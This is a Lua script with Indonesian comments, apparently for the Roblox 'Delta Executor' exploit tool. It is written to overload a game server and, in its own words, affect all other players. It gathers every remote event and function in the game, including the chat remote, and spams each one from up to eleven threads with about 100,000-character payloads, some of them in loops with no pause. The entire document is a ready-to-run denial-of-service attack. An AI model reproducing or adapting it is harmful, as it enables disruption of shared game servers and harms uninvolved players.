-- Server overload script - efek ke semua player lain (Delta Executor)
-- Hanya remote event spam masif dengan payload besar

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local localPlayer = Players.LocalPlayer

-- Kumpulkan semua RemoteEvent dan RemoteFunction
local remotes = {}
local function collectRemotes(container)
    for _, obj in ipairs(container:GetChildren()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            table.insert(remotes, obj)
        elseif obj:IsA("Folder") or obj:IsA("Model") or obj:IsA("Tool") then
            collectRemotes(obj)
        end
    end
end

-- Scan dari berbagai tempat
collectRemotes(ReplicatedStorage)
collectRemotes(game:GetService("Workspace"))
collectRemotes(game:GetService("Players"))
collectRemotes(game:GetService("Lighting"))
collectRemotes(game:GetService("CoreGui"))  -- kemungkinan ada remote di sini

-- Tambahkan remote chat default jika ada
local chatRemote = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
if chatRemote then
    local sayMsg = chatRemote:FindFirstChild("SayMessageRequest")
    if sayMsg and sayMsg:IsA("RemoteEvent") then
        table.insert(remotes, sayMsg)
    end
end

-- Payload besar untuk membebani server
local function createLargePayload()
    local payload = {}
    for i = 1, 1000 do
        payload[i] = string.rep("X", 100)  -- total 100.000 karakter
    end
    return payload
end
local bigData = createLargePayload()

-- Fungsi spam untuk satu remote (multi-thread)
local function spamRemote(remote)
    local isFunction = remote:IsA("RemoteFunction")
    while true do
        pcall(function()
            if isFunction then
                remote:InvokeServer(unpack(bigData))
            else
                remote:FireServer(unpack(bigData))
            end
        end)
        -- Tanpa wait, setip frame sebanyak mungkin
        RunService.Heartbeat:Wait()
    end
end

-- Jalankan spam untuk setiap remote di coroutine terpisah
for _, remote in ipairs(remotes) do
    task.spawn(spamRemote, remote)
end

-- Tambahan: spam ekstra melalui remote yang sudah ditemukan dengan loop lebih agresif
-- Menggunakan beberapa thread per remote
for i = 1, 10 do  -- 10 thread per remote untuk overload parah
    for _, remote in ipairs(remotes) do
        task.spawn(function()
            local isFunc = remote:IsA("RemoteFunction")
            while true do
                pcall(function()
                    if isFunc then
                        remote:InvokeServer(bigData)
                    else
                        remote:FireServer(bigData)
                    end
                end)
                -- Tanpa jeda sama sekali (maksimum rate)
            end
        end)
    end
end

-- Loop utama: tetap hidup dan tidak mengganggu client
while true do
    RunService.Stepped:Wait()
end
